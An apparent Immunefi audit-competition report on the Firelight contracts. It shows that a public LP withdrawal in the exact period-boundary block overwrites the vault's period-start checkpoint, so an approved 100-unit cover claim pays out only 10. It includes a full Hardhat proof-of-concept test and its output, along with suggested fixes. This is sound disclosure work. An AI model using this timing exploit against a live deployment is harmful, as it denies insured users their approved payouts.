# 89014 sc high exact boundary checkpoint overwrite underpays approved cover claims

**Submitted on Aug 16th 2026 at 14:07:51 UTC by @pks271 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89014
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/lib/Checkpoints.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Bug Description

The allocator validates committed cover capacity from the vault snapshot at a period boundary. After that validation, a public withdrawal can occur later in the same block and overwrite the vault checkpoint stored under that exact timestamp. A later payout re-reads the same timestamp as an immutable period-start exposure cap, so it uses the post-withdrawal value rather than the value used to validate and settle cover.

The source trace is:

`contracts/core/CoverOrderAllocator.sol#commitAllocation -> contracts/core/FirelightVault.sol#totalAssetsAt -> public withdraw in the same block -> contracts/core/FirelightVault.sol#_logTrace -> contracts/core/lib/Checkpoints.sol#push -> contracts/core/IncidentManager.sol#approveCurrentAssessment -> contracts/core/FirelightVault.sol#payout -> totalAssetsAt again`

The critical code paths are:

```solidity
// contracts/core/lib/Checkpoints.sol#push
if (exists && key == lastKey) {
    self._values[len - 1] = value;
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

The allocator capacity calculation consumes the boundary snapshot:

```solidity
// contracts/core/CoverOrderAllocator.sol#_computeAvailableCapacity
uint256 totalAssets = $.vault.totalAssetsAt($.vault.currentPeriodStart());
```

The payout later consumes the same lookup as its exposure cap:

```solidity
// contracts/core/FirelightVault.sol#payout
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

The public withdrawal writes a replacement checkpoint at the same timestamp:

```solidity
// contracts/core/FirelightVault.sol#withdraw
_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
```

As a result, cover can be validated and settled against 100 units, while a later approved loss for that settled cover is capped using 10 units.

## Impact

A public LP withdrawal in the same exact-boundary block as allocator validation can reduce the historical period-start asset snapshot. The Vault then pays only 10 of an approved 100-unit insurance loss even though the settled cover, approved assessment, and payable liability all support 100. The IncidentManager completes the incident with the 10-unit payout, leaving 90 units unpaid in the reproduced state. The report does not demonstrate a later payout path for the same closed incident.

The affected payout recipient does not need to be the withdrawing LP. The withdrawing LP has a direct economic incentive: it requests withdrawal immediately after cover capacity is committed, reducing the historical exposure cap before a subsequent covered incident is paid.

This is distinct from the disclosed “aggregate claims are not capped on-chain” issue. The PoC uses one legitimate claim whose amount is bounded by one settled cover; it does not submit duplicate, excessive, or multiple claims.

## Attack Vector and Preconditions

* A 100-unit cover order exists for the period.
* The allocator's normal boundary commitment executes in a block whose timestamp is exactly the mathematical period start.
* A public withdrawal from an LP is independently signed and included after that commit in the same block.
* The allocation is settled and a legitimate 100-unit incident assessment is approved. This is a single claim already bounded by one settled cover; it does not rely on the separately disclosed aggregate multi-claim cap limitation.
* The proof uses the real Vault, CoverOrderAllocator, CoverNFT, and IncidentManager. The allocator commit and incident setup are normal role operations used to create the insured state; the state rewrite itself is made by the public LP withdrawal.

## Recommendation

Make the period-start asset snapshot immutable and unambiguous. For example:

1. Write a once-only period-start checkpoint.
2. Derive the boundary value from the last checkpoint before the boundary.
3. Persist the exact vault snapshot in the allocation commitment and have payout consume that committed snapshot instead of re-querying the mutable same-key trace.

## Proof of Concept

The test disables automine, sends the allocator commit and LP withdrawal as separately signed transactions from different signers, mines them in one exact-boundary block, verifies both receipts succeed, and then settles a full 100-unit cover and approves a 100-unit loss.

```javascript
const { expect } = require("chai");
const { upgrades, ethers } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");
const { deployVault, computeMarketId } = require("../../../test/setup/fixtures.js");

const ONE = 10n ** 6n;
const ONE_E18 = 10n ** 18n;
const CLOSED_INCIDENT_STATUS = 4n;

describe("Period-start checkpoint rewrite with independent transactions", function () {
  it("underpays an approved claim after allocator and LP transactions share the exact boundary block", async function () {
    this.timeout(60000);

    const fixture = await deployVault();
    const { deployer, users, payout_receiver } = fixture;
    const vault = fixture.firelight_vault;
    const asset = fixture.token_contract;
    const lp = users[0];

    await fixture.utils.mintAndApprove(101n * ONE, lp);
    await vault.connect(lp).deposit(100n * ONE, lp.address);

    const buffer = await (await ethers.getContractFactory("MockERC20")).deploy("Buffer", "BUFFER", 6);
    const priceFeed = await (await ethers.getContractFactory("MockAggregatorV3")).deploy(18, ONE_E18);
    const coverNFT = await upgrades.deployProxy(
      await ethers.getContractFactory("CoverNFT"),
      ["Firelight Cover", "FLCOVER", "", deployer.address, deployer.address, ethers.ZeroAddress, ethers.ZeroAddress],
      { kind: "transparent" },
    );
    const market = {
      chainId: 1,
      protocol: "BoundaryCover",
      market: ethers.encodeBytes32String("boundary-cover"),
    };
    const marketId = computeMarketId(market.chainId, market.protocol, market.market);
    const allocation = [[marketId, 100n * ONE_E18]];
    const allocator = await upgrades.deployProxy(
      await ethers.getContractFactory("CoverOrderAllocator"),
      [
        {
          vault: vault.target,
          premiumCollector: deployer.address,
          coverNFT: coverNFT.target,
          priceFeedAdapter: priceFeed.target,
          maxPriceAge: 7 * 24 * 3600,
          premiumTokens: [asset.target],
          admin: deployer.address,
          adminRole: deployer.address,
          curatorRole: deployer.address,
          allocatorRole: deployer.address,
          configAdminRole: deployer.address,
          initialProtocolConcentrations: [
            { protocol: market.protocol, chainId: market.chainId, maxProtocolConcentrationBps: 10000 },
          ],
          newMarkets: [market],
          capacityConfig: {
            minCAR: 12000,
            firstLossBufferToken: buffer.target,
            firstLossBuffer: deployer.address,
            effectiveLeverage: 24000,
            minOrderMarketCoverAmount: 1,
            divergenceToleranceBps: 0,
          },
        },
      ],
      { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
    );
    await coverNFT.connect(deployer).grantRole(ethers.id("MINTER_ROLE"), allocator.target);
    await asset.connect(lp).approve(allocator.target, ONE);
    await allocator
      .connect(deployer)
      .createCoverOrder(
        lp.address,
        lp.address,
        lp.address,
        asset.target,
        [{ marketId, coverRateAnnual: 500, coverAmount: 100n * ONE_E18 }],
        0,
      );

    const tree = StandardMerkleTree.of([[0n, allocation]], ["uint256", "(bytes32,uint256)[]"]);
    const captureStart = await vault.currentPeriodEnd();
    const commitmentPeriod = await vault.periodAtTimestamp(captureStart);
    await priceFeed.setUpdatedAt(captureStart);
    await allocator.connect(deployer).setSettlementGracePeriod(0);

    const allocatorInterface = new ethers.Interface(["function commitAllocation(uint256,bytes32,uint256,uint256)"]);
    const vaultInterface = new ethers.Interface(["function withdraw(uint256,address,address)"]);
    const commitData = allocatorInterface.encodeFunctionData("commitAllocation", [
      commitmentPeriod,
      tree.root,
      100n * ONE_E18,
      200n * ONE_E18,
    ]);
    const withdrawalData = vaultInterface.encodeFunctionData("withdraw", [90n * ONE, lp.address, lp.address]);

    await ethers.provider.send("evm_setAutomine", [false]);
    try {
      const commitHash = await ethers.provider.send("eth_sendTransaction", [
        {
          from: deployer.address,
          to: allocator.target,
          data: commitData,
          gas: "0xf4240",
        },
      ]);
      const withdrawalHash = await ethers.provider.send("eth_sendTransaction", [
        {
          from: lp.address,
          to: vault.target,
          data: withdrawalData,
          gas: "0xf4240",
        },
      ]);
      await time.setNextBlockTimestamp(captureStart);
      await ethers.provider.send("evm_mine");
      const boundaryBlock = await ethers.provider.getBlock("latest");
      expect(boundaryBlock.timestamp).to.equal(captureStart);
      expect(boundaryBlock.transactions).to.include(commitHash);
      expect(boundaryBlock.transactions).to.include(withdrawalHash);
      expect((await ethers.provider.getTransactionReceipt(commitHash)).status).to.equal(1n);
      expect((await ethers.provider.getTransactionReceipt(withdrawalHash)).status).to.equal(1n);
    } finally {
      await ethers.provider.send("evm_setAutomine", [true]);
    }

    await allocator.settleCoverOrder(0n, allocation, tree.getProof(0));

    const incidentManager = await upgrades.deployProxy(
      await ethers.getContractFactory("IncidentManager"),
      [
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        payout_receiver.address,
        allocator.target,
        priceFeed.target,
        7 * 24 * 3600,
      ],
      { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
    );
    await vault.grantRole(await vault.PAYOUT_ROLE(), incidentManager.target);
    await vault.grantRole(await vault.INCIDENT_ROLE(), incidentManager.target);
    await incidentManager.createIncident(
      captureStart,
      "Boundary checkpoint incident",
      ethers.id("boundary-checkpoint"),
    );
    await incidentManager.confirmIncident(1, "ipfs://boundary-checkpoint");
    await incidentManager.addAssessmentLosses(1, [[0n, marketId, 100n * ONE_E18]]);
    await incidentManager.submitCurrentAssessment(1);
    await incidentManager.approveCurrentAssessment(1);

    const expectedPayout = process.env.EXPECT_FULL_PAYOUT === "1" ? 100n * ONE : 10n * ONE;
    const [incident] = await incidentManager.getIncident(1);
    expect(await vault.totalAssetsAt(captureStart)).to.equal(10n * ONE);
    expect(incident.status).to.equal(CLOSED_INCIDENT_STATUS);
    expect(incident.vaultPaidAmount).to.equal(expectedPayout);
    expect(await asset.balanceOf(payout_receiver.address)).to.equal(expectedPayout);
  });
});
```

From the repository root, run the current-behavior regression:

```bash
npx hardhat test --config audit/harness/hardhat.evidence.js audit/harness/test/period_start_checkpoint_rewrite_independent_transactions.js
```

Observed result:

```
Period-start checkpoint rewrite with independent transactions
  ✔ underpays an approved claim after allocator and LP transactions share the exact boundary block

1 passing
```

To show the economically correct payout and produce the failing assertion, run:

```bash
EXPECT_FULL_PAYOUT=1 npx hardhat test --config audit/harness/hardhat.evidence.js audit/harness/test/period_start_checkpoint_rewrite_independent_transactions.js
```

Observed failure:

```
AssertionError: expected 10000000 to equal 100000000.
+ expected - actual
-10000000
+100000000
```
